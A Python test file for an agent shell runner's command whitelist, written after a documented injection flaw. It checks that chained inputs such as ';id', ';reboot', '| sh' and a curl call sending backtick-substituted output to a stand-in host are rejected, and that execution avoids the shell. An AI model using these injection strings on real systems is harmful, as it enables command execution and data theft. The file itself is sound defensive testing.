"""Practice 108 (owner 16 Nov 2026): HB's older shell routes (/api/shell/execute, /api/shell/stream) and the agent shell runner execute a
whitelist match with shell=True, and patterns like "cat /var/log/<any text>" let "cat /var/log/x;id" through - the shell then also ran "id".
A whitelist match can no longer carry shell syntax."""
from fridays.shell_agent import _match_whitelist
import sqlite3
from types import SimpleNamespace
import pytest


def test_practice_108_chained_commands_never_match():
    for bad in ('cat /var/log/syslog;id', 'tail /var/log/syslog&&id', 'ping -c 1 x;reboot', 'curl -s https://x.example/`id`',
                'ps aux | grep x;id', 'ps aux | grep x | sh', 'cat /var/log/syslog > /tmp/out', 'ls $HOME', 'df -h\nid'):
        assert _match_whitelist(bad) is None, bad


def test_practice_108_plain_commands_still_match():
    for good in ('df -h', 'free -h', 'ps aux', 'ps aux | grep python', 'cat /var/log/syslog', 'journalctl -u apex-server.service -n 50',
                 'python3 scripts/db_query.py "SELECT 1;"'):
        assert _match_whitelist(good) is not None, good


@pytest.fixture
def owner_terminal(monkeypatch):
    from core import agent_identity,hb_tasks,hb_owner_sessions,hb_chat_controls
    from utils.db import _connection
    from fridays import shell_agent
    import database
    state={'active':True,'mode':'on','tools':['terminal_run']}
    def connect():
        conn=sqlite3.connect(':memory:')
        conn.execute('CREATE TABLE peer_messages(id INTEGER,message_id INTEGER)')
        conn.execute('INSERT INTO peer_messages VALUES(7,12)')
        return conn
    monkeypatch.setattr(_connection,'get_connection',connect)
    monkeypatch.setattr(hb_tasks,'for_request',lambda *_a:{'task_id':'T-OWNED','state':'active'})
    monkeypatch.setattr(hb_tasks,'invitation_tools',lambda *_a:state['tools'])
    monkeypatch.setattr(hb_owner_sessions,'for_task',lambda *_a,**_k:
                        {'allowed_tools':['terminal_run']} if state['active'] else None)
    monkeypatch.setattr(hb_chat_controls,'continuation',lambda *_a:{'mode':state['mode']})
    monkeypatch.setattr(hb_chat_controls,'held_requests',lambda *_a:[])
    monkeypatch.setattr(hb_chat_controls,'request_snapshot',lambda *_a:{'decision':'approved'})
    monkeypatch.setattr(database,'can_user_invoke_skill',lambda *_a,**_k:True)
    monkeypatch.setattr(shell_agent,'_log_sandpit',lambda *_a,**_k:None)
    monkeypatch.setattr(shell_agent,'_log_ghost_circle',lambda *_a,**_k:None)
    monkeypatch.setattr(shell_agent,'_AGENT_CMDS',{})
    calls=[]
    def popen(command,**kwargs):
        calls.append((command,kwargs))
        return SimpleNamespace(returncode=0,communicate=lambda **_k:('Python version\n',None))
    monkeypatch.setattr(shell_agent.subprocess,'Popen',popen)
    token=agent_identity.CURRENT.set({'principal':'apex','peer_request_id':7})
    try:yield shell_agent,state,calls
    finally:agent_identity.CURRENT.reset(token)


def test_owner_terminal_executes_plain_argv_not_a_shell(owner_terminal):
    shell,state,calls=owner_terminal
    ok,output=shell.run('.venv/bin/python --version',agent='apex',notify_ghost=False,owner_task_id='T-OWNED')
    assert ok and output=='Python version\n'
    assert calls[0][0]==['.venv/bin/python','--version']
    assert calls[0][1]['shell'] is False
    for command in ('pwd; whoami','ls $HOME','sudo systemctl restart swarm-terminal.service'):
        with pytest.raises(ValueError):
            shell.run(command,agent='apex',owner_task_id='T-OWNED')
    assert len(calls)==1


@pytest.mark.parametrize('blocker',['active','mode','tools'])
def test_owner_terminal_rechecks_authorization_before_execution(owner_terminal,blocker):
    shell,state,calls=owner_terminal
    state[blocker]={'active':False,'mode':'off','tools':[]}[blocker]
    with pytest.raises(PermissionError):
        shell.run('.venv/bin/python --version',agent='apex',owner_task_id='T-OWNED')
    assert calls==[]
